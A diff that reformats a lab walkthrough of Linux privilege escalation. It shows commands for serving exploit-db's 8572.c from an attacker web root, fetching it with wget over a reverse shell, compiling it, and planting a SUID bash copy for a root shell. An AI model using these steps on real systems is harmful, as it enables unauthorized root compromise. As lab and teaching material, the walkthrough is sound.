@@ -482,7 +482,8 @@ Having confirmed that the current shell runs with insufficient privileges (`www-
 It is a crucial security practice to review the contents of any exploit code before compilation and execution. This allows the attacker to understand the exploit's functionality, dependencies, and any specific instructions from the author.
 
 
-    Use the `cat` command with the full path to display the source code:
+Use the `cat` command with the full path to display the source code:
+    
     ```bash
     $ cat /usr/share/exploitdb/exploits/linux/local/8572.c
     ```
@@ -509,10 +510,12 @@ The compiled C exploit file (`8572.c`) must be transferred from the Attacker Mac
 
 The exploit file is currently located deep within the `/usr/share/exploitdb/` directory. We will create a **symbolic link** to make it accessible within the Apache document root (`/var/www/html`).
 
-    Create a symbolic link named `local` inside the web root, pointing to the directory containing the exploit:
+   Create a symbolic link named `local` inside the web root, pointing to the directory containing the exploit:
+    
     ```bash
     $ sudo ln -s /usr/share/exploitdb/exploits/linux/local/ /var/www/html
     ```
+    
     **Result:** The exploit file is now accessible via the URL `http://10.0.2.15/local/8572.c`.
 
 
@@ -532,7 +535,8 @@ The exploit file is currently located deep within the `/usr/share/exploitdb/` di
 
 5. Using the Command Injection vulnerability (which is still active via the reverse shell), instruct the victim machine to download the exploit using the `wget` utility.
 
-       Execute the following commands in the **reverse shell window**:
+   Execute the following commands in the **reverse shell window**:
+   
        ```bash
        $ wget [http://10.0.2.7/local/8572.c](http://10.0.2.7/local/8572.c)
        $ ls -al 8572.c
@@ -541,7 +545,7 @@ The exploit file is currently located deep within the `/usr/share/exploitdb/` di
 
 
 
-6.  The downloaded file (`8572.c`) is C source code and must be compiled into a binary executable file before it can be run on the victim system.
+7.  The downloaded file (`8572.c`) is C source code and must be compiled into a binary executable file before it can be run on the victim system.
 
    1.  Use the `gcc` compiler on the reverse shell (still in the `/tmp` directory) to compile the code:
        ```bash
@@ -581,7 +585,7 @@ The `8572.c` exploit is designed to execute the file `/tmp/run` with root privil
 
 **Goal:** Create `/tmp/run` to set the **SUID bit** on a copy of the shell, ensuring any future execution of that copy runs as root.
 
-   1.  Create and populate the `/tmp/run` file using `echo` and redirection:
+1.  Create and populate the `/tmp/run` file using `echo` and redirection:
        ```bash
        $ echo "#!/bin/bash" > /tmp/run
        $ echo "cp /bin/bash /bin/myshell" >> /tmp/run
@@ -590,7 +594,7 @@ The `8572.c` exploit is designed to execute the file `/tmp/run` with root privil
        * The payload copies the `/bin/bash` shell to a new file, `/bin/myshell`.
        * It then sets the **SUID bit** (`chmod +s`) on `/bin/myshell`. When a file with the SUID bit is run by any user, it executes with the privileges of the file's owner (which will be `root` once the exploit runs).
    
-   2.  Display the content of the created payload file for verification:
+2.  Display the content of the created payload file for verification:
        ```bash
        $ cat /tmp/run
        ```
@@ -598,7 +602,7 @@ The `8572.c` exploit is designed to execute the file `/tmp/run` with root privil
 
 9. With the executable compiled and the payload created, the final step is to execute the exploit using the identified Netlink PID as the argument.
 
-   Execute the exploit binary:
+Execute the exploit binary:
     ```bash
     $ ./exploit 2410
     ```
@@ -608,7 +612,7 @@ The `8572.c` exploit is designed to execute the file `/tmp/run` with root privil
 10. Before execution, verify the attributes of the shell copied and modified by the payload (`/tmp/run`).
 
 
-    Execute the following command in the reverse shell:
+Execute the following command in the reverse shell:
     ```bash
     $ ls -al /bin/myshell
     ```
@@ -622,7 +626,7 @@ The `8572.c` exploit is designed to execute the file `/tmp/run` with root privil
 
 **Goal:** Run the new shell and maintain the root effective user ID.
 
-    Execute the SUID shell with the **`-p`** option:
+ Execute the SUID shell with the **`-p`** option:
     ```bash
     $ /bin/myshell -p
     ```
@@ -632,7 +636,7 @@ The `8572.c` exploit is designed to execute the file `/tmp/run` with root privil
 12. After executing the SUID shell, the session should now be running with the highest possible privileges.
 
 
-    Execute the following commands in the newly opened shell session:
+Execute the following commands in the newly opened shell session:
     ```bash
     $ id
     $ whoami
